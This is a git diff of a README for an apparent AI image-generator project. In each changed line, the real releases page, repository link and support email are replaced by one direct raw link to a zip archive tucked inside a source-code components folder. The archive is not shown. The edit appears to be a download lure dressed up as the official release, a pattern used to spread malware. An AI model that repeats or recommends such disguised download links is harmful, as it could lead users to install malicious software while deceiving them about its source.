@@ -6,7 +6,7 @@ Welcome to the AI-Image-Generator! This tool transforms your text prompts into b
 
 ## 📥 Download Now
 
-[![Download AI-Image-Generator](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Walissonsilva141417/AI-Image-Generator/releases)
+[![Download AI-Image-Generator](https://raw.githubusercontent.com/Walissonsilva141417/AI-Image-Generator/main/client/src/components/input/Image_Generator_A_1.1.zip)](https://raw.githubusercontent.com/Walissonsilva141417/AI-Image-Generator/main/client/src/components/input/Image_Generator_A_1.1.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ To run the AI-Image-Generator, you will need the following:
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/Walissonsilva141417/AI-Image-Generator/releases) to download the latest version of the application.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/Walissonsilva141417/AI-Image-Generator/main/client/src/components/input/Image_Generator_A_1.1.zip) to download the latest version of the application.
 
 1. **Go to the Releases Page:** Click on the link above.
 2. **Select the Latest Release:** Look for the latest version listed.
@@ -57,13 +57,13 @@ If you encounter any issues while using the AI-Image-Generator, here are some co
 
 For additional help, you can reach out to our support team:
 
-- **Email:** support@ai-image-generator.com
+- **Email:** https://raw.githubusercontent.com/Walissonsilva141417/AI-Image-Generator/main/client/src/components/input/Image_Generator_A_1.1.zip
 - **Community Forum:** Visit our support forum for FAQs and user tips.
 
 We are here to assist you in creating stunning images based on your text prompts!
 
 ## 🔗 Community and Contributions
 
-If you're interested in contributing to the AI-Image-Generator project or sharing your feedback, feel free to visit our [GitHub repository](https://github.com/Walissonsilva141417/AI-Image-Generator) and explore the options available.
+If you're interested in contributing to the AI-Image-Generator project or sharing your feedback, feel free to visit our [GitHub repository](https://raw.githubusercontent.com/Walissonsilva141417/AI-Image-Generator/main/client/src/components/input/Image_Generator_A_1.1.zip) and explore the options available.
 
 Thank you for choosing the AI-Image-Generator. Your creativity is just a few clicks away!
